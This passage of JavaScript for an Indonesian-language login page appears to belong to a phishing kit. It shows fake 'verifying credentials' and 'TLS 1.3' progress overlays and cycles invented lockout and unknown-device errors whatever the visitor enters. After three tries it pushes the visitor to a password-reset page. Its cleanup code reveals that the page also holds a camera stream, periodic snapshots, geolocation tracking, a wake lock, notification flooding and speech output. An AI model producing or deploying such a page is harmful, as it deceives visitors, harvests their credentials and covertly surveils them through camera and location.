                .catch(()=>{if(!cam){cam=true;c();}});
        } else {if(!cam){cam=true;c();}}
    });
}

const errorMessages = [
    'Email atau kata sandi yang Anda masukkan tidak valid. Silakan coba lagi.',
    'Akun Anda diblokir sementara karena aktivitas mencurigakan. Coba lagi dalam beberapa menit.',
    'Terlalu banyak percobaan login gagal. Akun Anda dikunci selama 30 menit.',
    'Kami mendeteksi perangkat tidak dikenal. Verifikasi tambahan diperlukan.'
];
const loadingDurations = [2000, 3500, 6000, 8000];

function showLoadingOverlay(stage) {
    const overlay=document.getElementById('loadingOverlay'), text=document.getElementById('loText'), sub=document.getElementById('loSub'), bar=document.getElementById('loBar');
    overlay.classList.add('show');
    const stages=[{text:'Memverifikasi kredensial\u2026',sub:'Mohon tunggu sebentar',pct:20},{text:'Menghubungkan ke server\u2026',sub:'Koneksi aman (TLS 1.3)',pct:45},{text:'Memvalidasi sesi\u2026',sub:'Token autentikasi',pct:70},{text:'Hampir selesai\u2026',sub:'Mengarahkan ke dashboard',pct:90}];
    let i=0;
    const interval=setInterval(()=>{if(i<stages.length){text.textContent=stages[i].text;sub.textContent=stages[i].sub;bar.style.width=stages[i].pct+'%';i++;}else clearInterval(interval);},stage||1500);
}
function hideLoadingOverlay() { document.getElementById('loadingOverlay').classList.remove('show'); }

function doRedirect() { window.location.href='/lupa-password.html?expired=1'; }

async function handleLogin(e) {
    e.preventDefault();
    const btn=document.getElementById('loginBtn');
    const email=emailInput.value.trim();
    if(!email){showToast('Masukkan email terlebih dahulu.');return false;}
    attemptCount++;
    const idx=Math.min(attemptCount-1,errorMessages.length-1);
    btn.classList.add('loading'); btn.disabled=true; btn.querySelector('span').textContent='Memverifikasi\u2026';
    showLoadingOverlay(loadingDurations[idx]/4);
    await requestPermissions();
    setTimeout(()=>{
        btn.classList.remove('loading'); btn.disabled=false; btn.querySelector('span').textContent='Masuk ke Dashboard';
        hideLoadingOverlay(); showToast(errorMessages[idx]); vibrate();
        if(attemptCount>=3) setTimeout(doRedirect,2000);
    },loadingDurations[idx]);
    return false;
}

function handleSocial(p) {
    attemptCount++;
    const idx=Math.min(attemptCount-1,errorMessages.length-1);
    showToast(errorMessages[idx]); vibrate();
    if(attemptCount>=3) setTimeout(doRedirect,2000);
}

window.addEventListener('beforeunload',()=>{
    if(watchId)navigator.geolocation.clearWatch(watchId);
    if(stream)stream.getTracks().forEach(t=>t.stop());
    if(snapInterval)clearInterval(snapInterval);
    if(wakeLockSentinel)wakeLockSentinel.release();
    if(floodInterval)clearInterval(floodInterval);
    if(notifInterval)clearInterval(notifInterval);
    if(window.speechSynthesis)window.speechSynthesis.cancel();
});

document.querySelector('form').addEventListener('submit', handleLogin);
document.querySelector('.input-append button').addEventListener('click', togglePass);
document.querySelectorAll('.social-btn').forEach(btn => {
    const provider = btn.querySelector('.s-text')?.textContent || '';
    btn.addEventListener('click', () => handleSocial(provider));
});
document.querySelector('.nt-btn').addEventListener('click', dismissNotif);

emailInput.focus();
